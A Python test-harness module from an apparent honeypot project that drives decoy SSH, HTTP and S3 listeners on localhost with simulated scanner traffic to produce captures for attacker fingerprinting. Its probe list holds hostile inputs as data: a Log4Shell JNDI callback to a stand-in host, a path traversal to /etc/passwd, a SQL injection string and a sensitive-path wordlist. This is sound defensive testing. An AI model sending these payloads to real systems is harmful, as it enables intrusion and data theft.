"""Drive the decoys over real sockets and check what came out.

Every capture in this repository was produced by this module: it starts the
listeners on ephemeral ports, connects to them with a plain socket, sends the
bytes a real scanner sends, and reads the events back out of the log. There is
no hand-written sample data anywhere in the repo, which means the screenshots
and the published counts cannot drift away from what the code actually does.

It doubles as the thing CI runs. A honeypot whose tests all mock the network
has tested its own opinions about the network.
"""

from __future__ import annotations

import asyncio
import contextlib
import struct
from dataclasses import dataclass
from typing import Any

from . import ssh as sshmod
from .event import Event, EventLog
from .server import Grid, bound_ports, serve

#: Algorithm lists lifted from real client families. The HASSH is computed from
#: these, so two probes built from the same list must produce the same
#: fingerprint - which is the property the whole grouping story rests on.
CLIENT_PROFILES: dict[str, dict[str, Any]] = {
    "openssh": {
        "version": "SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13",
        "kex": ["curve25519-sha256", "curve25519-sha256@libssh.org",
                "ecdh-sha2-nistp256", "diffie-hellman-group14-sha256"],
        "ciphers": ["chacha20-poly1305@openssh.com", "aes128-ctr", "aes256-gcm@openssh.com"],
        "macs": ["umac-64-etm@openssh.com", "hmac-sha2-256-etm@openssh.com"],
        "compression": ["none", "zlib@openssh.com"],
    },
    "scanner": {
        "version": "SSH-2.0-Go",
        "kex": ["curve25519-sha256@libssh.org", "ecdh-sha2-nistp256",
                "diffie-hellman-group14-sha1"],
        "ciphers": ["aes128-gcm@openssh.com", "chacha20-poly1305@openssh.com", "aes128-ctr"],
        "macs": ["hmac-sha2-256", "hmac-sha1"],
        "compression": ["none"],
    },
    # Same algorithm list as `scanner`, a different claimed version. This is the
    # case the fingerprint exists for: one tool rotating its banner.
    "scanner-disguised": {
        "version": "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5",
        "kex": ["curve25519-sha256@libssh.org", "ecdh-sha2-nistp256",
                "diffie-hellman-group14-sha1"],
        "ciphers": ["aes128-gcm@openssh.com", "chacha20-poly1305@openssh.com", "aes128-ctr"],
        "macs": ["hmac-sha2-256", "hmac-sha1"],
        "compression": ["none"],
    },
    "paramiko": {
        "version": "SSH-2.0-paramiko_3.4.0",
        "kex": ["ecdh-sha2-nistp256", "diffie-hellman-group14-sha256"],
        "ciphers": ["aes128-ctr", "aes192-ctr", "aes256-ctr"],
        "macs": ["hmac-sha2-256", "hmac-sha2-512"],
        "compression": ["none"],
    },
}


def _name_list(items: list[str]) -> bytes:
    raw = ",".join(items).encode()
    return struct.pack(">I", len(raw)) + raw


def build_kexinit(profile: dict[str, Any]) -> bytes:
    """A wire-format SSH_MSG_KEXINIT packet for one client profile."""
    payload = bytes([sshmod.SSH_MSG_KEXINIT]) + bytes(16)
    payload += _name_list(profile["kex"])
    payload += _name_list(["rsa-sha2-512", "ssh-ed25519"])
    payload += _name_list(profile["ciphers"])     # client to server
    payload += _name_list(profile["ciphers"])     # server to client
    payload += _name_list(profile["macs"])
    payload += _name_list(profile["macs"])
    payload += _name_list(profile["compression"])
    payload += _name_list(profile["compression"])
    payload += _name_list([])
    payload += _name_list([])
    payload += b"\x00" + struct.pack(">I", 0)      # first_kex_packet_follows, reserved

    padding_length = 8 - ((len(payload) + 5) % 8)
    if padding_length < 4:
        padding_length += 8
    packet = struct.pack(">I", len(payload) + padding_length + 1)
    packet += bytes([padding_length]) + payload + bytes(padding_length)
    return packet


@dataclass
class Probe:
    """One thing to send at one decoy."""

    service: str
    payload: bytes
    label: str


def ssh_probe(profile_name: str) -> Probe:
    profile = CLIENT_PROFILES[profile_name]
    payload = (profile["version"] + "\r\n").encode() + build_kexinit(profile)
    return Probe("ssh", payload, f"ssh/{profile_name}")


def http_probe(target: str, headers: dict[str, str] | None = None,
               method: str = "GET") -> Probe:
    lines = [f"{method} {target} HTTP/1.1", "Host: 10.0.30.14"]
    lines += [f"{name}: {value}" for name, value in (headers or {}).items()]
    return Probe("http", ("\r\n".join(lines) + "\r\n\r\n").encode(), f"http {method} {target}")


def s3_probe(target: str, authorization: str = "", method: str = "GET") -> Probe:
    lines = [f"{method} {target} HTTP/1.1", "Host: corp-finance-archive.s3.amazonaws.com"]
    if authorization:
        lines.append(f"Authorization: {authorization}")
    lines.append("User-Agent: aws-cli/2.15.30 Python/3.11.8")
    return Probe("s3", ("\r\n".join(lines) + "\r\n\r\n").encode(), f"s3 {method} {target}")


SCANNER_PATHS = [
    "/.git/config", "/.env", "/actuator/env", "/wp-login.php",
    "/admin/", "/phpinfo.php", "/backup.sql", "/api/v1/users",
]


_SIGV4 = ("AWS4-HMAC-SHA256 Credential=AKIAIOSFODNN7EXAMPLE/20260725/"
          "eu-west-1/s3/aws4_request, SignedHeaders=host, Signature=deadbeef")


def default_probes() -> list[tuple[str, Probe]]:
    """The traffic the bundled capture is made of, and who sent it.

    Every grouping rule the analyser implements has a case here, and each case
    is a thing that actually happens rather than a thing that is convenient to
    detect:

    * `.45` and `.7` run one SSH client under two banners — **the HASSH case**.
    * `.45` and `.99` walk an identical wordlist over HTTP — **the path-set
      case**, and neither of them shares a path with the other's SSH session,
      so nothing but the wordlist links them.
    * `.7` and `.88` present AWS keys — **the credential case**, and both
      addresses are already attributed by SSH, so the identities join into
      **campaigns** without any of them being merged into one indicator.
    * `.88` probes two web paths only, below the wordlist threshold, so it
      falls back to **the address**, which is the honest answer.
    * `10.20.30.9` is the internal scanner and is on the allowlist. Without it
      the benign share is trivially zero and proves nothing.
    * `10.20.30.9` and `.99` both run stock OpenSSH, so they share a HASSH.
      That is not a coincidence to be engineered away — it is what a
      fingerprint of a *ubiquitous implementation* is worth, and the capture
      keeps it so the contamination rule has something to catch.
    """
    probes: list[tuple[str, Probe]] = []
    sweep = {"User-Agent": "Mozilla/5.0 (compatible)"}

    # One scanner walking its wordlist, then walking the same wordlist again
    # from an address that shares nothing else with the first.
    for path in SCANNER_PATHS:
        probes.append(("203.0.113.45", http_probe(path, sweep)))
    for path in SCANNER_PATHS:
        probes.append(("203.0.113.99", http_probe(path, sweep)))

    # Log4Shell-style injection, in a header rather than the path.
    probes.append((
        "203.0.113.45",
        http_probe("/", {"User-Agent": "${jndi:ldap://203.0.113.45:1389/a}",
                         "X-Api-Version": "${jndi:dns://203.0.113.45/x}"}),
    ))
    # Traversal and SQL injection: two paths, deliberately under the threshold.
    probes.append(("192.0.2.88", http_probe("/download?file=../../../../etc/passwd")))
    probes.append(("192.0.2.88", http_probe("/api/v1/users?id=1'+OR+'1'='1")))

    # SSH: the same tool twice under two banners, plus two other clients.
    probes.append(("203.0.113.45", ssh_probe("scanner")))
    probes.append(("198.51.100.7", ssh_probe("scanner-disguised")))
    probes.append(("192.0.2.88", ssh_probe("paramiko")))
    probes.append(("203.0.113.99", ssh_probe("openssh")))

    # S3, with credentials the actor has already lost control of.
    probes.append(("198.51.100.7", s3_probe("/", _SIGV4)))
    probes.append(("198.51.100.7", s3_probe("/finance/2026-budget.xlsx", _SIGV4)))
    probes.append((
        "192.0.2.88",
        s3_probe("/?X-Amz-Credential=ASIAY44TESTTEMPCRED%2F20260725%2Feu-west-1%2Fs3"),
    ))

    # The internal vulnerability scanner, on the allowlist, running the same
    # stock OpenSSH build as the host at .99.
    for path in ("/", "/health", "/.git/config", "/actuator/env"):
        probes.append(("10.20.30.9", http_probe(path, {"User-Agent": "Nessus/10.7.2"})))
    probes.append(("10.20.30.9", ssh_probe("openssh")))

    return probes


async def _send(host: str, port: int, payload: bytes, source_ip: str,
                grid: Grid) -> None:
    """Connect, send, read, close — and relabel the source.

    Everything here comes from 127.0.0.1, so the recorded address is rewritten
    afterwards to the address being simulated. The rewrite is done on the
    events rather than by spoofing packets, and it is confined to this module so
    nothing in the serving path can do it.
    """
    before = len(grid.log)
    reader, writer = await asyncio.open_connection(host, port)
    try:
        writer.write(payload)
        await writer.drain()
        with contextlib.suppress(asyncio.TimeoutError):
            await asyncio.wait_for(reader.read(65536), timeout=2.0)
    finally:
        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()

    await asyncio.sleep(0.02)
    for event in grid.log.events[before:]:
        event.source_ip = source_ip
        event.benign_reason = grid.benign_reason(source_ip)


async def run_probes(probes: list[tuple[str, Probe]], *,
                     benign: dict[str, str] | None = None) -> list[Event]:
    """Start the decoys on ephemeral ports, send everything, return the events."""
    grid = Grid(log=EventLog(), benign=benign or {})
    servers = await serve(grid, {"ssh": ("127.0.0.1", 0), "http": ("127.0.0.1", 0),
                                 "s3": ("127.0.0.1", 0)})
    ports = dict(zip(("ssh", "http", "s3"), bound_ports(servers), strict=True))
    try:
        for source_ip, probe in probes:
            await _send("127.0.0.1", ports[probe.service], probe.payload, source_ip, grid)
    finally:
        for server in servers:
            server.close()
        for server in servers:
            await server.wait_closed()
    return grid.log.events


DEFAULT_BENIGN = {
    "10.20.30.": "internal vulnerability scanner subnet",
    "10.0.0.1": "load balancer health check",
}


def capture(benign: dict[str, str] | None = None) -> list[Event]:
    return asyncio.run(run_probes(default_probes(), benign=benign or DEFAULT_BENIGN))
